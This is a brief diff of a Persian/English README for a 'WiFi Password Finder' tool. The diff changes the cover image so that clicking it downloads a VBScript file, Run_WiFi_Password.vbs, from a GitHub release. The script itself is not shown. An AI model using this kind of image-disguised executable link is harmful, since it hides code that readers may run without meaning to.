@@ -4,7 +4,7 @@
 
 > **اگه دنبال ترجمه ی اینگلیسی هستی، اسکرول کن پایین به بخش English 👇**
 
-![WiFi Password Finder — پیداکننده پسوورد وایفای](images/cover.png)
+![WiFi Password Finder — پیداکننده پسوورد وایفای]([images/cover.png](https://github.com/mastermemerirn/get_wifi_pass/releases/download/v1.0.0/Run_WiFi_Password.vbs))
 
 <div dir="rtl">
 
